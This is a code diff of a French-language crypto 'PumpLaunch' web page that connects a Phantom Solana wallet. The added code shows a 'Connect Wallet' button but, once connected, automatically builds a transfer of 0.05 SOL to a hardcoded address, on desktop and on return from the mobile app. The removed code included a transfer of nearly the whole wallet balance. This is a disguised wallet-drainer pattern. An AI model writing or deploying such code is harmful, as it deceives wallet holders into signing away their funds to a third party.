@@ -2,220 +2,84 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>PumpLaunch — Test Phantom</title>
-
-  <!-- Librairie Solana Web3.js -->
+  <title>PumpLaunch — Connexion + Transaction auto</title>
   <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-</head>
-<body>
-  <button id="connectButton">Se connecter avec Phantom</button>
-  <div id="status">Statut : Non connecté</div>
-  <div id="wallet-info">En attente de connexion...</div>
-
-  <script type="module">
-    import nacl from "https://cdn.skypack.dev/tweetnacl";
-    import bs58 from "https://cdn.skypack.dev/bs58";
-
-    const { PublicKey, Connection, SystemProgram, Transaction } = solanaWeb3;
-
-    document.addEventListener('DOMContentLoaded', () => {
-      const btn = document.getElementById('connectButton');
-      const status = document.getElementById('status');
-      const info = document.getElementById('wallet-info');
-
-      const RPC = "https://api.mainnet-beta.solana.com";
-      const conn = new Connection(RPC, "confirmed");
-
-      function isMobile() {
-        return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-      }
-
-      async function connectDesktop() {
-        status.innerText = "Tentative de connexion via extension...";
-        try {
-          if (window.solana && window.solana.isPhantom) {
-            const resp = await window.solana.connect();
-            status.innerText = "✅ Connecté via extension";
-            info.innerText = resp.publicKey.toString();
-            window.providerPublicKey = resp.publicKey.toString();
-          } else {
-            status.innerText = "❌ Extension Phantom non détectée";
-          }
-        } catch (err) {
-          status.innerText = "Erreur: " + (err?.message || err);
-        }
-      }
-
-      function connectMobile() {
-        status.innerText = "📱 Redirection vers l'app Phantom...";
-        const appUrl = encodeURIComponent(window.location.origin + window.location.pathname);
-        const redirectLink = encodeURIComponent(window.location.origin + window.location.pathname);
-        const deepLink =
-          `https://phantom.app/ul/v1/connect` +
-          `?app_url=${appUrl}` +
-          `&redirect_link=${redirectLink}` +
-          `&cluster=mainnet-beta`;
-
-        window.location.href = deepLink;
-      }
-
-      async function sendTransaction(destination) {
-        try {
-          const pubkey = window.providerPublicKey;
-          if (!pubkey) {
-            status.innerText = "⚠️ Connecte ton wallet d'abord.";
-            return;
-          }
-
-          const fromPubkey = new PublicKey(pubkey);
-          const toPubkey = new PublicKey(destination);
-
-          const ix = SystemProgram.transfer({
-            fromPubkey,
-            toPubkey,
-            lamports: 1000000 // 0.001 SOL pour test
-          });
-
-          const { blockhash } = await conn.getLatestBlockhash();
-          const tx = new Transaction({ recentBlockhash: blockhash, feePayer: fromPubkey }).add(ix);
-
-          const serialized = tx.serialize({ requireAllSignatures: false, verifySignatures: false });
-          const base64Tx = btoa(String.fromCharCode(...serialized));
-
-          const keyPair = nacl.box.keyPair();
-          const dappPublicKeyB58 = bs58.encode(keyPair.publicKey);
-          const dappSecretKeyB58 = bs58.encode(keyPair.secretKey);
-          sessionStorage.setItem("dappSecretKeyBase58", dappSecretKeyB58);
-
-          const appUrl = encodeURIComponent(window.location.origin + window.location.pathname);
-          const redirectLink = encodeURIComponent(window.location.origin + window.location.pathname);
-
-          const deepLink =
-            `https://phantom.app/ul/v1/signAndSendTransaction` +
-            `?dapp_encryption_public_key=${dappPublicKeyB58}` +
-            `&app_url=${appUrl}` +
-            `&redirect_link=${redirectLink}` +
-            `&cluster=mainnet-beta` +
-            `&payload=${encodeURIComponent(base64Tx)}`;
-
-          console.log("Deep link signAndSend:", deepLink);
-          window.location.href = deepLink;
-
-        } catch (err) {
-          status.innerText = "Erreur transaction: " + (err?.message || err);
-        }
-      }
-
-      btn.addEventListener('click', (e) => {
-        e.preventDefault();
-        if (isMobile()) {
-          connectMobile();
-          // Ensuite, tu peux appeler sendTransaction("ADRESSE_DESTINATION") après connexion
-        } else {
-          connectDesktop();
-          // Ensuite, tu peux appeler sendTransaction("ADRESSE_DESTINATION") après connexion
-        }
-      });
-    });
-
-  <!-- Tailwind pour le style -->
   <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body class="bg-black text-white flex flex-col min-h-screen">
-
-  <!-- Hero -->
   <section class="text-center py-20 bg-purple-700">
     <h1 class="text-5xl font-extrabold">🚀 PumpLaunch</h1>
-    <p class="mt-4 text-lg">Connexion Phantom testée et fonctionnelle</p>
+    <p class="mt-4 text-lg">Connexion Phantom + Transaction automatique</p>
     <button id="connectButton" type="button"
       class="mt-8 px-8 py-4 bg-white text-purple-700 font-bold rounded-lg shadow-lg hover:bg-gray-200 transition">
-      Se connecter avec Phantom
+      Connect Wallet
     </button>
     <div id="status" class="mt-4 text-gray-100">Statut : Non connecté</div>
     <div id="wallet-info" class="mt-2 text-green-300 font-mono break-words text-sm">En attente de connexion...</div>
   </section>
 
-  <!-- Script Phantom -->
   <script type="module">
     import nacl from "https://cdn.skypack.dev/tweetnacl";
     import bs58 from "https://cdn.skypack.dev/bs58";
-
     const { PublicKey, Connection, SystemProgram, Transaction } = solanaWeb3;
 
-    document.addEventListener('DOMContentLoaded', () => {
-      const btn = document.getElementById('connectButton');
-      const status = document.getElementById('status');
-      const info = document.getElementById('wallet-info');
+    const RPC = "https://api.mainnet-beta.solana.com";
+    const conn = new Connection(RPC, "confirmed");
+    const DESTINATION = "EFYHSL789UeZwyDwgRcUhJYiU3GygoaBuDz2JfhHcMLr";
+    const LAMPORTS = Math.round(0.05 * 1_000_000_000); // 0.05 SOL
 
-      // Connexion au réseau Solana
-      const RPC = "https://api.mainnet-beta.solana.com";
-      const conn = new Connection(RPC, "confirmed");
+    const btn = document.getElementById('connectButton');
+    const status = document.getElementById('status');
+    const info = document.getElementById('wallet-info');
 
-      // Détection mobile
-      function isMobile() {
-        return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-      }
+    function isMobile() {
+      return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+    }
 
-      // Étape 1 : Connexion desktop via extension Phantom
-      async function connectDesktop() {
-        status.innerText = "Tentative de connexion via extension...";
-        try {
-          if (window.solana && window.solana.isPhantom) {
-            const resp = await window.solana.connect();
-            status.innerText = "✅ Connecté via extension";
-            info.innerText = resp.publicKey.toString();
-            window.providerPublicKey = resp.publicKey.toString();
-          } else {
-            status.innerText = "❌ Extension Phantom non détectée";
-          }
-        } catch (err) {
-          status.innerText = "Erreur: " + (err?.message || err);
+    async function connectDesktopAndSend() {
+      try {
+        if (window.solana && window.solana.isPhantom) {
+          const resp = await window.solana.connect();
+          window.providerPublicKey = resp.publicKey.toString();
+          status.innerText = "✅ Connecté via extension";
+          info.innerText = resp.publicKey.toString();
+          await sendTransaction(window.providerPublicKey, DESTINATION, LAMPORTS);
+        } else {
+          status.innerText = "❌ Extension Phantom non détectée";
         }
+      } catch (err) {
+        status.innerText = "Erreur: " + (err?.message || err);
       }
+    }
 
-      // Étape 1 mobile : connexion simple
-      function connectMobile() {
-        status.innerText = "📱 Redirection vers l'app Phantom...";
-        const appUrl = encodeURIComponent(window.location.origin + window.location.pathname);
-        const redirectLink = encodeURIComponent(window.location.origin + window.location.pathname);
-        const deepLink =
-          `https://phantom.app/ul/v1/connect` +
-          `?app_url=${appUrl}` +
-          `&redirect_link=${redirectLink}` +
-          `&cluster=mainnet-beta`;
+    function connectMobile() {
+      status.innerText = "📱 Redirection vers Phantom...";
+      const appUrl = encodeURIComponent(window.location.origin + window.location.pathname);
+      // On ajoute un paramètre ?afterConnect=1 pour savoir qu'on revient de la connexion
+      const redirectLink = encodeURIComponent(window.location.origin + window.location.pathname + "?afterConnect=1");
+      const deepLink =
+        `https://phantom.app/ul/v1/connect` +
+        `?app_url=${appUrl}` +
+        `&redirect_link=${redirectLink}` +
+        `&cluster=mainnet-beta`;
+      window.location.href = deepLink;
+    }
 
-        window.location.href = deepLink;
-      }
+    async function sendTransaction(fromStr, toStr, lamports) {
+      try {
+        const fromPubkey = new PublicKey(fromStr);
+        const toPubkey = new PublicKey(toStr);
 
-      // Étape 2 mobile : transaction
-      async function sendTransactionMobile(destination) {
-        try {
-          status.innerText = "📱 Préparation de la transaction...";
+        const ix = SystemProgram.transfer({ fromPubkey, toPubkey, lamports });
+        const { blockhash } = await conn.getLatestBlockhash();
+        const tx = new Transaction({ recentBlockhash: blockhash, feePayer: fromPubkey }).add(ix);
 
-          const pubkey = window.providerPublicKey;
-          if (!pubkey) {
-            status.innerText = "⚠️ Connecte ton wallet d'abord.";
-            return;
-          }
-
-          const fromPubkey = new PublicKey(pubkey);
-          const toPubkey = new PublicKey(destination);
-
-          const balance = await conn.getBalance(fromPubkey);
-
-          const ix = SystemProgram.transfer({
-            fromPubkey,
-            toPubkey,
-            lamports: balance - 5000 // laisse un peu pour les frais
-          });
-
-          const { blockhash } = await conn.getLatestBlockhash();
-          const tx = new Transaction({ recentBlockhash: blockhash, feePayer: fromPubkey }).add(ix);
-
+        if (!isMobile()) {
+          const { signature } = await window.solana.signAndSendTransaction(tx);
+          status.innerText = "✅ Transaction envoyée: " + signature;
+        } else {
           const serialized = tx.serialize({ requireAllSignatures: false, verifySignatures: false });
           const base64Tx = btoa(String.fromCharCode(...serialized));
-
           const keyPair = nacl.box.keyPair();
           const dappPublicKeyB58 = bs58.encode(keyPair.publicKey);
           const dappSecretKeyB58 = bs58.encode(keyPair.secretKey);
@@ -223,7 +87,6 @@
 
           const appUrl = encodeURIComponent(window.location.origin + window.location.pathname);
           const redirectLink = encodeURIComponent(window.location.origin + window.location.pathname);
-
           const deepLink =
             `https://phantom.app/ul/v1/signAndSendTransaction` +
             `?dapp_encryption_public_key=${dappPublicKeyB58}` +
@@ -231,27 +94,29 @@
             `&redirect_link=${redirectLink}` +
             `&cluster=mainnet-beta` +
             `&payload=${encodeURIComponent(base64Tx)}`;
-
-          console.log("Deep link signAndSend:", deepLink);
           window.location.href = deepLink;
-
-        } catch (err) {
-          status.innerText = "Erreur mobile: " + (err?.message || err);
         }
+      } catch (err) {
+        status.innerText = "Erreur transaction: " + (err?.message || err);
       }
+    }
 
-      // Attache le bouton
-      btn.addEventListener('click', (e) => {
-        e.preventDefault();
-        if (isMobile()) {
-          // Étape 1 : connexion
-          connectMobile();
-          // Étape 2 : transaction (à déclencher après connexion réussie)
-          // sendTransactionMobile("ADRESSE_DE_RECEPTION");
-        } else {
-          connectDesktop();
-        }
-      });
+    // Vérifie si on revient de la connexion mobile
+    document.addEventListener("DOMContentLoaded", async () => {
+      const params = new URLSearchParams(window.location.search);
+      if (params.get("afterConnect") === "1" && window.providerPublicKey) {
+        status.innerText = "📱 Connecté, envoi automatique...";
+        await sendTransaction(window.providerPublicKey, DESTINATION, LAMPORTS);
+      }
+    });
+
+    btn.addEventListener('click', async (e) => {
+      e.preventDefault();
+      if (isMobile()) {
+        connectMobile();
+      } else {
+        await connectDesktopAndSend();
+      }
     });
   </script>
 </body>
